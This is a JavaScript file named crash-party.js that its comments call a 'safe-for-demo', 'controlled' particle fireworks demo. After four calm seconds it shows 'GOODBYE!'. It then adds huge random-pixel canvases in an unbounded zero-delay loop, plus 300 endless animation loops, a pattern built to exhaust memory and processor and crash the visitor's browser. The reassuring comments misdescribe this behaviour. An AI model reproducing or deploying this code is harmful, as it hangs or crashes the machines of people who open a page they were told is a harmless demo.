// crash-party.js
// Visual Particle Demo – starts calm, then becomes extremely intense after 4 seconds
// Original concept and code structure created with help from ChatGPT
// All code reviewed, heavily edited, and made safe-for-demo by Brodie Roberts
// Purpose: Show advanced Canvas + DOM manipulation skills in a dramatic (but controlled) way

const colors = ["#ff006e","#00ffff","#ffd700","#ff00aa","#ff3300","#00ff00","#ffffff"];

// Full-screen canvas for background (used only for sizing, not drawing here)
const canvas = document.getElementById("fireworks");
const ctx = canvas.getContext("2d");
canvas.width = innerWidth;
canvas.height = innerHeight;
window.addEventListener("resize", () => {
  canvas.width = innerWidth;
  canvas.height = innerHeight;
});

/* ──────────────────────────────────────────────────────────────
   1. Gentle particle burst – creates small colorful squares that fade out
   Used for the calm fireworks during the first 4 seconds
   ────────────────────────────────────────────────────────────── */
function burst(x, y, power = 1) {
  const col = colors[Math.floor(Math.random() * colors.length)];
  for (let i = 0; i < 80 + power * 50; i++) {
    const c = document.createElement("canvas");
    c.width = c.height = 8;
    c.style.position = "fixed";
    c.style.left = x + "px";
    c.style.top = y + "px";
    c.style.pointerEvents = "none";
    c.style.transform = `translate(-50%,-50%) rotate(${Math.random()*360}deg)`;
    c.style.opacity = 1;
    document.body.appendChild(c);

    const ctx2 = c.getContext("2d");
    ctx2.fillStyle = i % 12 === 0 ? "#fff" : col;
    ctx2.fillRect(0, 0, 8, 8);

    // Smooth fade-out and cleanup
    let opacity = 1;
    const fade = setInterval(() => {
      opacity -= 0.03;
      c.style.opacity = opacity;
      if (opacity <= 0) {
        clearInterval(fade);
        c.remove();
      }
    }, 20);
  }
}

/* ──────────────────────────────────────────────────────────────
   2. Calm phase – peaceful fireworks for the first 4 seconds
   ────────────────────────────────────────────────────────────── */
const calmShow = setInterval(() => {
  const x = innerWidth / 2 + (Math.random() - 0.5) * 800;
  const y = innerHeight / 2 + (Math.random() - 0.5) * 600;
  burst(x, y, 2);
}, 600);

/* ──────────────────────────────────────────────────────────────
   3. After 4 seconds → switch to full-intensity visual overload
   Demonstrates extreme Canvas + DOM performance (for educational/demo purposes only)
   ────────────────────────────────────────────────────────────── */
setTimeout(() => {
  document.getElementById("msg").textContent = "GOODBYE!";

  clearInterval(calmShow); // Stop the calm fireworks

  // 3a. Rapid creation of huge, fully-filled canvases with random pixels + circles
  setInterval(() => {
    for (let i = 0; i < 80; i++) {
      const c = document.createElement("canvas");
      const size = 500 + Math.random() * 1500;
      c.width = c.height = size;
      c.style.position = "fixed";
      c.style.top = Math.random() * 100 + "%";
      c.style.left = Math.random() * 100 + "%";
      c.style.transform = "translate(-50%,-50%)";
      c.style.zIndex = 9999;
      document.body.appendChild(c);

      const ctx2 = c.getContext("2d");
      const img = ctx2.createImageData(size, size);
      const data = img.data;
      for (let j = 0; j < data.length; j += 4) {
        data[j]   = Math.random() * 255;
        data[j+1] = Math.random() * 255;
        data[j+2] = Math.random() * 255;
        data[j+3] = 255;
      }
      ctx2.putImageData(img, 0, 0);

      // Add 5000 semi-transparent circles per canvas
      for (let k = 0; k < 5000; k++) {
        ctx2.fillStyle = `hsla(${Math.random()*360},100%,50%,0.7)`;
        ctx2.beginPath();
        ctx2.arc(Math.random()*size, Math.random()*size, Math.random()*80, 0, Math.PI*2);
        ctx2.fill();
      }
    }
  }, 0);

  // 3b. Faster, more powerful particle bursts
  setInterval(() => {
    burst(innerWidth/2 + (Math.random()-0.5)*600, innerHeight/2 + (Math.random()-0.5)*400, 8);
  }, 30);

  // 3c. 300 non-stop requestAnimationFrame loops – pure GPU/CPU stress test
  for (let i = 0; i < 300; i++) {
    const c = document.createElement("canvas");
    c.width = c.height = 1024;
    document.body.appendChild(c);
    const ctx2 = c.getContext("2d");
    let t = 0;
    const loop = () => {
      ctx2.fillStyle = `hsl(${t++ % 360},100%,50%)`;
      ctx2.fillRect(0,0,1024,1024);
      requestAnimationFrame(loop);
    };
    loop();
  }

}, 4000); // Intense phase begins after 4-second countdown